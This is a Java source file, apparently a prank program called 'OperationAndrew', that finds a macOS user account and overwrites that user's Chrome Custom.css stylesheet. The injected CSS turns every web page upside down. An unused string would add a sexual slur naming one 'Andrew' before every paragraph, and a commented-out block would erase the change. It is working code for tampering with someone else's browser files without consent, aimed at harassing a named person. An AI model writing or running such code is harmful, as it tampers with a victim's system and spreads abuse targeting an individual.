import java.io.*;

import javax.swing.JOptionPane;

public class OperationAndrew {	
	
	static String hack1 = "body {-webkit-transform: rotate(180deg);transform: rotate(180deg);}";
	static String hack2 = "p:before {content: \" ANDREW IS A FILTHY WHORE! \";}";
	
	public static void main(String args[]) {
		String cmd = "";
		String filePath = "";
		String str = "", user = "";
		
		//	Find user account name
		cmd = "ls /Users";
		
		try {
			Runtime runtime = Runtime.getRuntime();
			InputStream input = runtime.exec(cmd).getInputStream();
			BufferedInputStream buffer = new BufferedInputStream(input);
			BufferedReader output = new BufferedReader(new InputStreamReader(buffer));
			String line = "";
			try {
				while((line = output.readLine()) != null) {
					str += line + "\n";
				}
			}	catch(Exception e) {e.printStackTrace();}
		}	catch(Exception e) {e.printStackTrace();}

		//	Split off the user account name
		int count = 0;
		for(int i = 0;i < str.length();i++) {		
			if(str.substring(i, i+1).equals("\n"))
				count++;
		}
		String[] names = new String[count];
		names = str.split("\n");
		for(int i = 0;i < count;i++) {
			if(names[i].equals("Shared") || names[i].equals("Guest"))
				continue;
			else
				user = names[i];
		}
		
		//	Write to Custom.css
		filePath = "/Users/" + user + "/Library/Application Support/Google/Chrome/Default/User StyleSheets/Custom.css";

		File file = new File(filePath);
		if(!file.exists()) {
			JOptionPane.showMessageDialog(null,"Error: File not found.");
			System.exit(0);
		}
		
		try {
			FileWriter fw = new FileWriter(file.getAbsoluteFile(), false);
			fw.write(hack1);
			
			/*	Erase hack code
			fw.close();
			fw = new FileWriter(file.getAbsoluteFile(), false);
			for(int i = 0;i < 100;i++) fw.write("");
//			*/
			
			fw.close();
		}	catch(Exception e) {e.printStackTrace();}
	}
}
